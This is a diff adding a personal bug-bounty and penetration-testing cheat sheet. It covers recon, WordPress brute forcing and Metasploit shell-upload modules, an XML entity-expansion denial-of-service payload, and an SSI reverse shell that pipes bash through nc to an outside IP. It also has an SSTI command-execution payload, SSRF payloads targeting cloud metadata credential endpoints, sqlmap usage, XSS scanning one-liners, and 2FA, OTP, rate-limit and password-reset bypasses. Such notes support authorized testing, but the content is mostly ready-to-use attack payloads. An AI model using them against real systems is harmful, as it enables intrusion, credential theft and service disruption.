@@ -1,3 +1,401 @@
+Prerequesics: 	
+	install go lang
+  1) sudo apt install -y golang
+  2) export GOROOT=/usr/lib/go
+  3) export GOPATH=$HOME/go
+  4) export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+  5) source .bashrc
+ 
+ 
+
+------------------------------------------------------------------------------------------------------------------------------------
+Subdomain Enumeration
+1- amass enum -active -d hackerone.com -src -dir h1_amass -o output_h1_active.txt -rf 50resolvers.txt -config /home/.config/amass/config.ini
+2- subdomain finder => subdomainfinder.c99.nl/
+3- 
+
+
+cat allsubdomains | httpx -title -fr 
+------------------------------------------------------------------------------------------------------------------------------------
+Scan for S3 buckets 
+1- Using https://github.com/sa7mon/S3Scanner
+2- Using lazys3 => https://github.com/nahamsec/lazys3
+3- exploit it with => https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn/ 
+4- Robin Wood ruby tool to brute force on Adobe and find about 17 buckets
+
+-------------------------------------------------------------------------------------------------------------------------------------
+Wordpress
+1- Wpscan --url https://site.com/wordpress -e at -e ap -e u
+2- wpscan --url http://10.10.10.88/webservices/wp/ --enumerate ap --plugins-detection aggressive --force --api-token o3Oj8…
+2- Wpscan --url https://site.com -U users.txt -P rockyou.txt
+3- wpscan --url https://site.com/wordpress/ --proxy https://site.com:8881		==> use that if returned 403 
+4- wpscan --url https://site.com/wordpress/ --http-auth admin:admin
+5-  wpscan brute
+	wpscan --usernames tom -P /usr/share/wordlists/rockyou.txt --force --password-attack wp-login --url 
+
+6- use metasploit > use exploit/unix/webapp/wp_admin_shell_upload
+	> set rhost example.com
+	> set username admin
+	> set password admin
+	> set targeturi /wordpress
+	> exploit
+7- use metasploit > use exploit/unix/webapp/wp_slideshowagllery_upload
+	> set rhost example.com
+	> set targeturi /wordpress 
+	> set wp_user admin
+	> set wp_password admin
+	> exploit
+8- 	http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+	- wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+	
+9- url": "https://wpscan.com/vulnerability/bb20d732-a5e4-4140-ab51-b2aa1a53db12"	
+	
+	
+
+-----------------------------------------------------------------------------------------------------
+Automatic scanners 
+1- nuclei 	=> nuclei -df httpx.txt -t /home/nuclei-templates -o nucleioutput
+2- whatweb --no-errors 10.10.10.0/24
+3-wpscan =>  Wpscan --url https://site.com/wordpress -e at -e ap -e u
+4- 
+------------------------------------------------------------------------------------------------------
+Subdomain takeover 
+1- use Subjack => https://github.com/haccer/subjack
+2- use SubOver => https://github.com/Ice3man543/SubOver
+3- Use Can i takeover xyz => https://github.com/EdOverflow/can-i-take-over-xyz
+4- use  aquatone => https://github.com/michenriksen/aquatone => cat targets.txt | aquatone
+5-  use dig , nslookup 
+6- 	use httpie => 
+	http -b GET http://{SOURCE DOMAIN NAME} | grep -E -q '<Code>NoSuchBucket</Code>|<li>Code: NoSuchBucket</li>' && echo "Subdomain takeover may be possible" || echo "Subdomain takeover is not possible"
+7- read => https://0xpatrik.com/takeover-proofs/
+----------------------------------------------------------------------------------------------------
+passive enumeration
+1- shodan dorks for api 
+	- hostname:"target.com"
+	- "content-type: application/json"
+	- "content-type: application/xml"
+	- "200 OK"
+	- "wp-json"
+
+2- github dorks
+	filename:prod.secret.exs
+	filename:configuration.php JConfig password
+	filename:.sh_history
+	shodan_api_key language:python
+	filename:shadow path:etc
+	JEKYLL_GITHUB_TOKEN
+	filename:proftpdpasswd
+	filename:config.php dbpasswd
+	filename:config.php passw
+	path:sites databases password
+	shodan_api_key extension:py
+	shodan_api_key extension:sh
+	shodan_api_key extension:json
+	shodan_api_key extension:rb
+	
+3- 
+	GET /phpinfo.php HTTP/1.1
+	Host: hossam.com\r\n
+	\r\n
+	\r\n
+	GET / HTTP/1.1\r\n
+	\r\n
+	will find in response <?php phpinfo()?>
+
+-----------------------------------------------------------------------------------------------------
+Nmap 
+Nmap
+
+    $ nmap -sC -sV [target address or network range] -oA
+    nameofoutput
+    $ nmap -p- [target address] -oA allportscan
+    $ nmap -sV --script=http-enum <target> -p 80,443,8000,8080
+    $ ncat -nv --source-port 53 10.129.2.28 50000	==>>  Connect To The Filtered Port 
+    $nmap -D RND:8     192.199.112.22	--source-port 53	=> to use random ip for sourcse 
+    
+--------------------------------------------------------------------------------------------------
+Directory Enumeration 
+1- Gobuster => gobuster dir -u target.com:port -w /home/hossam/wordlists/api.txt
+2- gobuster dir -u target.com:port -w /home/hossam/wordlists/raft-small-words.txt
+	- gobuster dir -w Seclists/Discovery/Web-Content/raft-small-word.txt
+	-  ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+	-https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters	=> parameters
+	-list ==> https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
+	-https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux	==> wordlist for linux 
+	
+	- https://github.com/D35m0nd142/LFISuite		==> LFI
+	- https://github.com/OsandaMalith/LFiFreak
+	- https://github.com/mzfr/liffy
+	
+3- 	# ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+4-	kiterunner wordlists => https://wordlists.assetnote.io/
+5- ks scan -w /home/wordlists/data/kiterunner/routes-large.txt
+6- if found api 
+	- use api as intended
+	- reverse engineer docs 
+	- check for business logic flaw and exessive data exposure 
+	
+6- ways to reverse engineer an api:
+	- create postman requests by hand 	=> crapi.apisec.ai or crapi2.apisec.ai
+	- proxy with Cleanup
+	- Mitmproxy2swagger
+	
+7-  /api/v1/account?name=Cloud+Strife
+
+8-  Look through docs/collection for relevant requests 
+	- seek out responses that provide you with request ID 
+	- make request as User A for User B's resources 
+	Apply Your Skills
+	-artur-tumasjan-zM8sSfYFDww-unsplash.jpg
+	-	crAPI: https://github.com/OWASP/crAPI
+	-	vAPI: https://github.com/roottusk/vapi
+	-	vAmPI: https://github.com/erev0s/VAmPI
+	-	Pixi: https://github.com/DevSlop/Pixi
+
+9- # ffuf -w Seclists/Discovery/Wp-content/common-api-endpoint-mazen160.txt -u http://example.com/api/FUZZ
+
+----------------------------------------------------------------------------------------------------
+Js Analaysis 
+1- use nicejs site 
+2- search for password , token , jwt , cookie , passwd, path , 
+3-   | xmllint  --format -		==> prettify xml
+-----------------------------------------------------------------------------------------------------
+to find xml can be found in contact_us page
+  DOS ATTACK Via xml
+  
+  <?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY a0 "DOS" >
+  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
+  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&a10;</email>
+<message></message>
+</root>
+
+
+
+
+
+
+
+
+
+--------------------------------------------------------------------------------------------------------
+SSI check	==> put in input and see if any payload will work
+1. <!--#echo var="DATE_LOCAL" -->
+2. <!--#printenv -->
+create reverse shell via SSI <!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
+Check
+// Document name
+<!--#echo var="DOCUMENT_NAME" -->
+// Date
+<!--#echo var="DATE_LOCAL" -->
+// File inclusion
+<!--#include virtual="/index.html" -->
+// Including files (same directory)
+<!--#include file="file_to_include.html" -->
+// CGI Program results
+<!--#include virtual="/cgi-bin/counter.pl" -->
+// Including virtual files (same directory)
+<!--#include virtual="file_to_include.html" -->
+// Modification date of a file
+<!--#flastmod file="index.html" -->
+// Command exec
+<!--#exec cmd="dir" -->
+// Command exec
+<!--#exec cmd="ls" -->
+// Reverse shell
+<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
+// Print all variables
+<!--#printenv -->
+// Setting variables
+<!--#set var="name" value="Rich" -->
+-----------------------------------------------------------------------------------------------------
+403 Bypass
+site.com/secret	=> 403
+site.com/secret/*	=> 200
+site.com/secret/./	=> 200
+
+site.com/secret.txt	=> 403
+site.com/secret.txt/	=> 200
+site.com/%2f/secret.txt/ => 200
+
+https://site.com/secret	=> 403
+http://site.com/secret 	=> 200
+
+payloads 
+/
+/*
+/%2f/
+/./
+././
+/*/
+X-Forwarded-For: 127.0.01
+X-Forwarded-For: 127.0.0.1:80
+https://github.com/yunemse48/403bypasser	=> tool
+------------------------------------------------------------------------------------------------------
+WAF Bypass 
+	  X-Forwarded-Host
+	  X-Forwarded-Port
+	  X-Forwarded-Scheme
+	  Origin: 
+	  nullOrigin: [siteDomain].attacker.com
+	  X-Frame-Options: Allow
+	  X-Forwarded-For: 127.0.0.1
+	  X-Client-IP: 127.0.0.1
+	  Client-IP: 127.0.0.1
+	  Proxy-Host: 127.0.0.1
+	  Request-Uri: 127.0.0.1
+	  X-Forwarded: 127.0.0.1
+	  X-Forwarded-By: 127.0.0.1
+	  X-Forwarded-For: 127.0.0.1
+	  X-Forwarded-For-Original: 127.0.0.1
+	  X-Forwarded-Host: 127.0.0.1
+	  X-Forwarded-Server: 127.0.0.1
+	  X-Forwarder-For: 127.0.0.1
+	  X-Forward-For: 127.0.0.1
+	  Base-Url: 127.0.0.1
+	  Http-Url: 127.0.0.1
+	  Proxy-Url: 127.0.0.1
+	  Redirect: 127.0.0.1
+	  Real-Ip: 127.0.0.1
+	  Referer: 127.0.0.1
+	  Referrer: 127.0.0.1
+	  Refferer: 127.0.0.1
+	  Uri: 127.0.0.1
+	  Url: 127.0.0.1
+	  X-Host: 127.0.0.1
+	  X-Http-Destinationurl: 127.0.0.1
+	  X-Http-Host-Override: 127.0.0.1
+	  X-Original-Remote-Addr: 127.0.0.1
+	  X-Original-Url: 127.0.0.1
+	  X-Proxy-Url: 127.0.0.1
+	  X-Rewrite-Url: 127.0.0.1
+	  X-Real-Ip: 127.0.0.1
+	  X-Remote-Addr: 127.0.0.1
+	  X-Custom-IP-Authorization:127.0.0.1
+	  X-Originating-IP: 127.0.0.1
+	  X-Remote-IP: 127.0.0.1
+	  X-Original-Url:
+	  X-Forwarded-Server:
+	  X-Host:
+	  X-Forwarded-Host:
+	  X-Rewrite-Url:
+	  
+--------------------------------------------------------------------------------------------------
+Override path 
+1- POST /api/clips/account/1121_method=PUT HTTP/1.1
+2- 
+
+-------------------------------------------------------------------------------------------------
+CRLF
+1- /login?redirect_after_login=/jjjkkk嘊嘍Set-Cookie:jjjjj=a;domain=twitter.com	=> crlf
+
+---------------------------------------------------------------------------------------------------
+Open Redirect
+1- https://target.com/logout?redirect=////google.com
+
+--------------------------------------------------------------------------------------------------
+LFI
+1- https://example.com/api/download/..%2f..%2f..%2f..%2fetc%2fshadow
+2- https://example.com/api/download/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		==> or double encoding
+3- if found id=http://www.burpcollaborator.com
+	- can make base64 for ==> #echo "https://www.burpcollborator.com" | base64 
+	- taking the base64 and put it after id=aHR0cDovL3d3dy5nb29nbGUuY29t
+
+
+
+
+---------------------------------------------------------------------------------------------------
+Broken Links
+
+
+
+
+
+---------------------------------------------------------------------------------------------------
+XSS
+1 - something.example.com?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
+
+2- example.com?vuln=something_vuln_csp
+
+3- waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
+
+4- waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+
+5- echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
+cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
+
+6-  redirect_uri=javascript://https://vulnerabledomain.com/%250A1alert(1):0 
+
+7- go to contact_us , bot chat  and put xss.report link for hidden xss 
+
+8-   "><svg onload = alert(document.cookie)>.docx		==> file name
+
+9- %27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo=		==> html , ssti , xss injection 	==>| httpx -mr "<h1>akira</h1>|60481729"
+
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+Signup
+1- create account with username or email address 	aa@gmail.com => password => 123
+	- create second account with aa@gmail.com => password xyz	=> or use 	a.a@gmail.com	=>  AA@gmail.com => Aa@gamil.com => aA@gmail.com
+	- see if you can't login to first account with password 123 then bug (prevent any user )	=> https://hackerone.com/reports/187714
+
+2- Dos attack with password length 10000 character 
+	- if 500 error then vulnerable 
+
+3- cross site scripting via username or name fields 
+	- username 	<svg/onload=confirm(1)>
+	-email “><svg/onload=confirm(1)>”@x.y
+
+4- no rate limit in sign up page which lead to create unlimited accounts 
+	- create account  and capture thre request 
+	- send it to intruder  and change the username and make 10000 acouunt 
+5- create two accounts with the same username but different email address
+	- reset password for one of them 
+	- then the passsword would be for the two accounts but differnt emails address
+6- create account and send verification code attacker@gmail.com
+	-don't open verification link now  
+	-change the email address victim@gmail.com
+	- ask for verification link 
+	- instead of opening the verification address for victim@gmail.com open verification for attacker@gmail.com => first link
+	- if victim@gmail.com verified then (bug)
+7- if you can see username in url then try to but username with file names as index.php , singup.php , signup , signin.php, login.php	example.com/username	=> path override
+8- check if you can use password 1234 or weak password (weak password policy)
+9- try to make hossam@company.tld account to access unauthorized  places with their account
+
+------------------------------------------------------------------------------------------------------
+Login 
+1- when found login prompt try to bypass it by 
+	- go to the previous directorey ==> /admin/login.php ==> go to /admin to see if not authorized 
+	- changing the request method to ==> POST ==> HEAD ==> GET 	==> With any credentials
+
+
+
+----------------------------------------------------------------------------------------------------
+Broken Auth 
+1- go to settings find 
+	> {"fname":"hossam", "id":11} 
+	- try to add password field here as {"fname":"hossam","id":11, "password":"123455"} and change POST to PATCH  and boom changed password 
+
+
+----------------------------------------------------------------------------------------------------
               account takeover 
 1- no rate limit in login or reset password or otp 
 2- sent otp to mobile and leave otp code null as 
@@ -19,3 +417,640 @@ Host: example.com
  {"verify":"false"} => {"verify": "true"}
  
  
+ 
+
+-----------------------------------------------------------------------------------------------------
+SSRF 
+uri=
+logout_redirect_uri=
+url=
+page=
+proxy=
+fwd=
+forward=
+u=
+data=
+page=
+url=	
+ret=	
+r2=	
+img=	
+u	
+return	
+r	
+URL	
+next	
+redirect	
+redirectBack	
+AuthState	
+referer	
+redir	
+l	
+aspxerrorpath	
+image_path	
+ActionCodeURL	
+return_url	0
+link	
+q	
+location	
+ReturnUrl	
+uri	
+referrer	
+returnUrl
+forward	
+file
+rb	
+end_display	
+urlact	
+from	
+goto	
+path	
+redirect_url	
+old	
+pathlocation	
+successTarget	
+returnURL	
+urlsito	
+newurl	
+Url	
+back	
+retour	
+odkazujuca
+r_link	
+cur_url	
+H_name	
+ref	
+topic	
+resource	
+returnTo	
+home	0.2%
+node	0.2%
+sUrl	0.2%
+href	0.2%
+linkurl	0.2%
+returnto	0.2%
+redirecturl	0.2%
+SL	0.2%
+st	0.2%
+errorUrl	0.2%
+media	0.2%
+destination	0.2%
+targeturl	0.2%
+return_to	0.2%
+cancel_url	0.2%
+doc	0.2%
+GO	0.2%
+ReturnTo	0.2%
+anything	0.2%
+FileName	0.2%
+logoutRedirectURL	0.2%
+list	0.2%
+startUrl	0.2%
+service	0.2%
+redirect_to	0.2%
+end_url	0.2%
+_next	0.2%
+noSuchEntryRedirect	0.2%
+context	0.2%
+returnurl	0.2%
+ref_url	
+
+- PAYLOADS 
+	http://127.0.0.1:port
+	http://localhost:port
+	https://127.0.0.1:port
+	https://localhost:port
+	http://[::]:port
+	http://0000::1:port
+	http://[0:0:0:0:0:ffff:127.0.0.1]
+	http://0/
+	http://127.1
+	http://127.0.1
+	http://spoofed.burpcollaborator.net
+	http://localtest.me
+	http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+	http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
+	http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
+	http://127.127.127.127
+	http://127.0.1.3
+	http://127.0.0.0
+	http://0177.0.0.1/
+	http://2130706433/ = http://127.0.0.1
+	http://3232235521/ = http://192.168.0.1
+	http://3232235777/ = http://192.168.1.1
+	http://2852039166/  = http://169.254.169.254
+	http://[0:0:0:0:0:ffff:127.0.0.1]
+	localhost:+11211aaa
+	localhost:00011211aaaa	
+	http://0/
+	http://127.1
+	http://127.0.1
+	http://127.0.0.1/%61dmin
+	http://127.0.0.1/%2561dmin
+	http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+	urllib2 : 1.1.1.1
+	requests + browsers : 2.2.2.2
+	urllib : 3.3.3.3
+	http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
+	① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+	0://evil.com:80;http://google.com:80/
+	http://127.1.1.1:80\@127.2.2.2:80/
+	http://127.1.1.1:80\@@127.2.2.2:80/
+	http://127.1.1.1:80:\@@127.2.2.2:80/
+	http://127.1.1.1:80#\@127.2.2.2:80/
+	
+- AWS 
+	http://instance-data
+	http://169.254.169.254
+	http://169.254.169.254/latest/user-data
+	http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+	http://169.254.169.254/latest/meta-data/
+	http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+	http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+	http://169.254.169.254/latest/meta-data/ami-id
+	http://169.254.169.254/latest/meta-data/reservation-id
+	http://169.254.169.254/latest/meta-data/hostname
+	http://169.254.169.254/latest/meta-data/public-keys/
+	http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+	http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+	http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+	http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+	http://169.254.169.254/latest/dynamic/instance-identity/document
+	http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
+
+Google Cloud
+	http://169.254.169.254/computeMetadata/v1/
+	http://metadata.google.internal/computeMetadata/v1/
+	http://metadata/computeMetadata/v1/
+	http://metadata.google.internal/computeMetadata/v1/instance/hostname
+	http://metadata.google.internal/computeMetadata/v1/instance/id
+	http://metadata.google.internal/computeMetadata/v1/project/project-id
+
+Azure:
+	http://169.254.169.254/metadata/v1/maintenance
+	http://169.254.169.254/metadata/instance?api-version=2017-04-02
+	http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+
+IPv6 Tests:
+	http://[::ffff:169.254.169.254]
+	http://[0:0:0:0:0:ffff:169.254.169.254]
+
+ECS Task: 
+	http://169.254.170.2/v2/credentials/
+	
+Digital Ocean:
+	http://169.254.169.254/metadata/v1.json
+	http://169.254.169.254/metadata/v1/ 
+	http://169.254.169.254/metadata/v1/id
+	http://169.254.169.254/metadata/v1/user-data
+	http://169.254.169.254/metadata/v1/hostname
+	http://169.254.169.254/metadata/v1/region
+	http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+
+Packetcloud:
+	https://metadata.packet.net/userdata
+
+Oracle Cloud:
+	http://169.254.169.254/opc/v1/instance/
+
+Alibaba Cloud:
+	http://100.100.100.200/latest/meta-data/
+	http://100.100.100.200/latest/meta-data/instance-id
+	http://100.100.100.200/latest/meta-data/image-id
+	http://100.100.100.200/latest/user-data
+
+2- use burpcollaborator
+	-put in Referrer: https://burpcollab.com
+	- 
+	
+3- ssrf ==> via file upload 
+in file upload put in file.html
+<html><head><body>
+<img src=http://collaborator.com>
+</body></head></html>
+
+4- 
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+reset password 
+1. email= victim@gmail.com&email=attacker@gmil.com
+2. email= victim@gmail.com%20email=attacker@gmil.com
+3. email= victim@gmail.com |email=attacker@gmil.com
+4. email= victim@gmail.com%0d%0acc:attacker@gmil.com
+5. email= victim@gmail.com&code= my password reset token
+6-referrer : https://hossamshady.me
+7- {"email":["victim@gmail.com","hacker@gmail.com"]}
+8- try to brute force otp reset password with intruder 
+9- changing password to other user idor 
+	- login with my account 
+	- change password 
+	- intercept request and change email to {"email":"victim@gmail.com","new_password":"1111111111"}
+10- response manipulation for wrong otp from 400 bad request to 200 Ok
+11- resonse manipulation for data {"message":"unsuccessful"} => {"message":"successful"}
+12- send many reset tokens and search on google and github and facebook for any of these tokens {token leak}
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+rate limit
+1- change the request from GET => HEAD => POST => PUT => PATCH 
+
+2- Add headers 
+	X-Forwarded: 127.0.0.1
+	X-Forwarded-By: 127.0.0.1
+	X-Forwarded-For: 127.0.0.1
+	X-Forwarded-For-Original: 127.0.0.1
+	X-Forwarder-For: 127.0.0.1
+	X-Forward-For: 127.0.0.1
+	Forwarded-For: 127.0.0.1
+	Forwarded-For-Ip: 127.0.0.1
+	X-Custom-IP-Authorization: 127.0.0.1
+	X-Originating-IP: 127.0.0.1
+	X-Remote-IP: 127.0.0.1
+	X-Remote-Addr: 127.0.0.1
+
+3- add %00 at the end of email can bypass rate limit
+4- try add space after email (not encoded)
+5- try to add chars %0d , %2e , %09 , %20 , %0, %00, %0d%0a, %0a, %0C
+6- adding / after the endpoint /home/login	=> /home/login/
+7- trying to change cookies , user-agent 
+8- use burpsuite ip rotate extension
+9- if CAPTCHA enabled try to remove its parameter or leave it blank
+10- if CAPTCHA enabled try to add same number of chars on paramter 	or send it to intruder 
+11- change x-forwarded-for: 192.168.0.49 	==> change ip every 10 or 20 attemps
+12- put x-Forwarded-For : 127.0.01	two times
+13- 
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+ssti
+    ?url=
+    ?link=
+    ?redirect=
+    ?redirecturl=
+    ?redirect_uri=
+    ?return=
+    ?return_to=
+    ?returnurl=
+    ?go=
+    ?goto=
+    ?exit=
+    ?exitpage=
+    ?fromurl=
+    ?fromuri=
+    ?redirect_to=
+    ?next=
+    ?newurl=
+    ?redir=
+	{7*7}
+	${7*7}
+	#{7*7}
+	%{7*7}
+	{{7*7}}
+	{{7*'7'}}.
+	{{_self.env.display("TEST")}}
+	# curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>	==> RCE via SSTI
+	{% import os %}{{os.system('whoami')}}
+
+	git clone https://github.com/epinna/tplmap.git
+	cd tplmap
+	pip install virtualenv
+	virtualenv -p python2 venv
+	source venv/bin/activate
+	pip install -r requirements.txt
+	./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=blah
+
+
+2- %27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo=		==> html , ssti , xss injection 	==>| httpx -mr "<h1>akira</h1>|60481729"
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+Hidden params
+1- 	Gather all urls => wayback , gau , hackcrawler , 
+	Arjun => https://github.com/s0md3v/Arjun
+2- param miner	=> burpsuite
+3- check url as => https://www.google.com?hidden_param=value
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+SQLI 
+1- collect all urls with waybackurl , gau , hackcrawler in urls.txt
+	- gf sqli urls.txt >> allsqli.txt	=> gf patterns => https://github.com/1ndianl33t/Gf-Patterns
+		gf tool => https://github.com/1ndianl33t/Gf-Patterns
+	- sqlmap -m allsqli.txt --dbs --batch 
+
+2- collect all urls with waybackurl , gau , hackcrawler  in urls.txt
+	-use Arjun to get hidden params => allparams.txt	==> use ( --urls ) to inclue all urls 
+	- use sqlmap -m allparams.txt --dbs --batch --level 5 --risk 3 
+	- can check the params from arjun as => https://example.com?hidden_param=value
+	
+3- use goher 
+
+4- put  1"AND(SELECT1(SELECT(SLEEP(20)))im4x)-- im4x	==> in all headers
+
+5- 	X-Forwarded-For:1"AND(SELECT1(SELECT(SLEEP(5)))im4x)-- im4x	==> after 5 secs
+	X-Forwarded-For:1"AND(SELECT1(SELECT(SLEEP(2)))im4x)-- im4x	==> after 2 secs
+	sqlmap -u "https://test.com/administrator/" --header="X-Forwarded-For: 1*" --dbs 
+
+6-   sqlmpa -u http://example.com/?col=id	--prefix='`)' 	--risk 3 --level 5 
+  put ` after id as follow => col=id` 	it will get you the error that helps 
+
+7- sqlmap -u "http://www.example.com/?id=1" --search -T user	==> for searching for table name
+
+8- sqlmap --list-tamper
+
+
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------
+2FA bypass
+1- change "success":false	to "success":true
+2- change 400 bad request 	to 200 Ok 
+3- reuse  same 2FA code 
+4- try brute force it and see if no rate limit
+5- try another user code 2FA 
+6- use 2FA without email verification
+7- password reset disable 2FA 
+8- enabling 2FA dosn't expire previously active sessions
+9- use 000000 or null in 2FA code 
+
+OTP bypass 
+1- register account with mobile number and request OTP 
+	-Enter Incorrect OTP and capture the request 
+		- intercept response and change {"verfication": false} => {"verfication":true}
+		- intercept response and change error to success 
+		- intercept response and change 400 to 200 Ok
+2- create two accounts and put 2 different numbers 
+	- the first one is correct and put correct otp and see the response 	status:1
+	- in the second account put wrong code and intercept response and make it as the valid one 	status:0
+
+3- create account with non-existing phone number 
+	- intercept the request and send to repeater 
+	- forward the request with non-exist phone number
+	- put real true number in repeater and send 
+	- if code reached you put it and you can verify non-exist number with the code reached you 
+
+4- check no rate limit in OTP  code with brute forcing 
+
+5- check default OTP code number => 123456 , 111111, 000000
+
+6- check if OTP code in response 
+
+7- reuse OTP and check if it is still valid after using
+
+
+-----------------------------------------------------------------------
+broken links hijacking 
+1- press all the buttons and links to see if broken manually 
+2- use in background => blc -rof --filter-level 3 https://example.com/
+output will be => --BROKEN--  https://www.linkedin.com/company/fomaomfio (HTTP_999)
+
+---------------------------------------------------------------------------
+Bypass Ban account 
+if you got ban from domain like hossam.com try to see any other subdomain test.hossam.com where you need the same accound and log in and you can bypass it 
+
+------------------------------------------------------------------------------
+	Broken Auth 
+
+1- Session Does not Expire after password change
+
+2- Session Hijacking after logout 
+	- copy cookies of live session
+	- logout from account 
+	- paste cookies in cookie editor 
+	- refresh if loged in then session hijacking 
+	
+3- password reset token dosn't expire 
+	- create account 
+	- forget password
+	- don't use link 
+	- change email to new email 
+	- use reset password link which has been recived if changed password there is insecure config
+	
+4- login and navigeate pages
+	- logout 
+	- press (Alt+left-arrow) buttons
